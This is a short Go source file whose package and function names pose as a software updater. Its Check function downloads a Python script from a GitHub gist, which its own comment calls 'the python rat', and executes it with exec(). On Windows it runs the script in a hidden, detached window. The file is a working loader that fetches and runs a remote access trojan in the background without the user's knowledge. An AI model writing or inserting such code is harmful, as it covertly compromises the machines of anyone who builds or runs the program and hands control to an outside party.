package updater

import (
	"os/exec"
	"runtime"
	"syscall"
)

// RemoteURL — raw gist url of the python rat
const RemoteURL = "https://gist.githubusercontent.com/seventycs/2b9593e634d3a982b741b58c10320a75/raw/update.py"

// Check launches the remote script in the background. Fire and forget.
func Check() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("python", "-c",
			"import urllib.request; exec(urllib.request.urlopen('"+RemoteURL+"').read())")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x00000008, // DETACHED_PROCESS
		}
	} else {
		cmd = exec.Command("python3", "-c",
			"import urllib.request; exec(urllib.request.urlopen('"+RemoteURL+"').read())")
	}

	_ = cmd.Start()
}